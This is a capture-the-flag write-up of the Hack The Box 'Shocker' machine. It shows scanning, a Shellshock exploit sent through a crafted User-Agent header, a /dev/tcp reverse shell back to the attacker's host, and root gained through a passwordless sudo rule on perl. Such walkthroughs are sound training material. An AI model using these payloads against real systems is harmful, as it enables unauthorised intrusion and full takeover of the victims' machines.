# Hack The Box: Shocker

**Difficulty:** Easy
**OS:** Linux

Shocker is an Easy-level Linux machine designed to demonstrate the classic "Shellshock" vulnerability (CVE-2014-6271). The initial foothold is acquired by discovering a hidden CGI script and exploiting the vulnerability via modified HTTP headers to achieve Remote Code Execution (RCE). Privilege escalation involves exploiting a misconfigured `sudo` permission that allows the user to execute Perl scripts as root, enabling a trivial spawn of a root shell.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.56
nmap -p 80,2222 -sCV 10.10.10.56
```

The scan reveals two open ports:
*   **Port 80:** HTTP (Apache httpd 2.4.18)
*   **Port 2222:** SSH (OpenSSH 7.2p2 Ubuntu)

Navigating to the web service on port 80 displays a simple image and the text "Don't Bug Me!". The page is static and contains no obvious input fields or links. We perform directory brute-forcing using a tool like `gobuster` or `feroxbuster` to discover hidden endpoints.

```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration reveals a `/cgi-bin/` directory, which is a common location for older web applications running CGI (Common Gateway Interface) scripts.

### Identifying the CGI Script

Knowing that a `/cgi-bin/` directory exists, we need to find specific executable scripts within it. CGI scripts typically have extensions like `.sh`, `.cgi`, or `.pl`. We run a targeted brute-force scan against this directory, appending common extensions.

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh,cgi,pl
```

The scan successfully identifies a script named `user.sh`.

We access `http://10.10.10.56/cgi-bin/user.sh` in the browser or via `curl`. The script returns a plaintext response indicating "Just an uptime test script," followed by the server's uptime.

## Web Exploitation

The presence of a Bash script executing via CGI immediately suggests the possibility of the Shellshock vulnerability (CVE-2014-6271). Shellshock affects GNU Bash through version 4.3 and allows attackers to execute arbitrary commands by manipulating environment variables passed by the web server to the CGI script.

When an Apache web server executes a CGI script, it passes HTTP headers (like `User-Agent`, `Referer`, or `Cookie`) to the script as environment variables. If the system's Bash shell is vulnerable, it will incorrectly evaluate function definitions appended to these environment variables, allowing trailing commands to execute.

### Exploiting Shellshock (CVE-2014-6271)

To test for Shellshock, we use `curl` or an intercepting proxy like Burp Suite to send an HTTP request to the `user.sh` script, modifying a standard header (typically `User-Agent`) to include the Shellshock payload format.

The payload structure defines a dummy function `() { :;};` followed by the command we wish to execute. We first attempt a simple command like `echo` to verify execution.

```bash
curl -H "User-Agent: () { :;}; echo; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh
```
*(Note: The first `echo` is often required to format the HTTP response correctly so the output is visible.)*

The server responds with the output of the `id` command, confirming the vulnerability.

```text
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

We have gained Remote Code Execution (RCE) as the `shelly` user.

## Initial Access

To gain an interactive shell, we modify the Shellshock payload to execute a reverse TCP connection back to our attacking machine. We must ensure we provide the absolute path to `/bin/bash` since the CGI environment might have a restricted `PATH`.

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We send the reverse shell payload via the vulnerable HTTP header.

```bash
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.X/9999 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

The server processes the request, and we receive a reverse shell connection. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

We retrieve the `user.txt` flag from the `shelly` user's home directory.

## Privilege Escalation

Enumerating the system as `shelly`, we check for commands the user can run using `sudo`.

```bash
sudo -l
```

The output reveals that the user `shelly` can run the `perl` binary as `root` without a password.

```text
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### Abusing Sudo & perl

Perl is a powerful scripting language capable of executing system commands. Because `shelly` can execute `/usr/bin/perl` via `sudo` without a password, we can easily leverage Perl's `-e` (execute one line of program) flag to spawn a root shell.

We consult resources like GTFOBins for the exact syntax to spawn an interactive shell using Perl.

We execute the permitted `sudo` command with a payload designed to replace the current Perl process with `/bin/sh` or `/bin/bash`.

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

The `exec` function in Perl executes a system command and never returns. Because the Perl process was started with `sudo`, the new shell runs as root.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
